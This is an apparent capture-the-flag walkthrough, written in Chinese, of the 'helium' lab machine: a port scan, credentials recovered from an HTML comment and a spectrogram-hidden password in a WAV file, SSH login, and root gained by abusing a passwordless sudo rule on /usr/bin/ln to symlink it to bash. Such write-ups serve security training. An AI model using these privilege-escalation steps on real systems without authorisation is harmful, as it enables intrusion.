## Nmap

先扫全端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.139
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-05 00:20 -0400
Nmap scan report for 192.168.205.139
Host is up (0.00018s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A5:33:9C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.01 seconds
```

开放了 `22/80`，优先看 Web。

## Web

访问 80 端口首页：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.139
<title>RELAX</title>
<!doctype html>
<html lang="en">

<!-- Please paul, stop uploading weird .wav files using /upload_sound -->

<head>
<style>
body {
  background-image: url('screen-1.jpg');
  background-repeat: no-repeat;
  background-attachment: fixed; 
  background-size: 100% 100%;
}
</style>
    <link href="bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
<audio src="relax.wav" preload="auto loop" controls></audio>
</body>
```

注释中泄露了用户名 `paul` 和路径 `/upload_sound`。

访问 `/upload_sound/`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.139/upload_sound/ -i
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 05 Jul 2026 04:21:03 GMT
Content-Type: text/html
Content-Length: 26
Last-Modified: Sun, 22 Nov 2020 19:22:24 GMT
Connection: keep-alive
ETag: "5fbaba70-1a"
Accept-Ranges: bytes

Upload disabled (or not).
```

暂时没有可上传的入口，继续看页面引用的静态资源。

## 隐写

`bootstrap.min.css` 内容并不是真正的 CSS，而是一个路径：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.139/bootstrap.min.css
/yay/mysecretsound.wav
```

下载这个 wav 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget 192.168.205.139/yay/mysecretsound.wav
--2026-07-05 00:22:13--  http://192.168.205.139/yay/mysecretsound.wav
正在连接 192.168.205.139:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：204814 (200K) [application/octet-stream]
正在保存至: "mysecretsound.wav"

mysecretsound.wav       100%[=============================>] 200.01K  --.-KB/s  用时 0.003s

2026-07-05 00:22:13 (66.5 MB/s) - 已保存 "mysecretsound.wav" [204814/204814])
```

使用 Audacity 打开该文件并切换到频谱图视图，可以看到隐藏在高频段的像素字符：

![image-20260705123041544](http://7r1UMPHK.github.io/image/20260705131249351.webp)

```text
dancingpassyo
```

结合前面注释中泄露的用户名 `paul`，得到凭据：

```text
paul:dancingpassyo
```

## SSH

使用获取的凭据登录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh paul@192.168.205.139
paul@192.168.205.139's password: 
Linux helium 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
Last login: Sun Nov 22 14:31:51 2020 from 192.168.1.58
paul@helium:~$ id
uid=1000(paul) gid=1000(paul) groups=1000(paul)
```

读取 user flag：

```bash
paul@helium:~$ cat /home/paul/user.txt
ilovetoberelaxed
```

## 提权

查看 sudo 权限：

```bash
paul@helium:~$ sudo -l
Matching Defaults entries for paul on helium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln
```

可以以 root 身份无密码执行 `/usr/bin/ln`。

利用思路：用 `ln` 把 `/usr/bin/ln` 自身覆盖为 `/bin/bash` 的符号链接，然后再次 `sudo /usr/bin/ln` 时实际执行的就是 bash，并且带有 `-p` 参数保留 euid：

```bash
paul@helium:~$ sudo /usr/bin/ln -fs /bin/bash /usr/bin/ln
paul@helium:~$ sudo /usr/bin/ln -p
root@helium:/home/paul# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root

```bash
root@helium:/home/paul# cat /root/root.txt
ilovetoberoot
```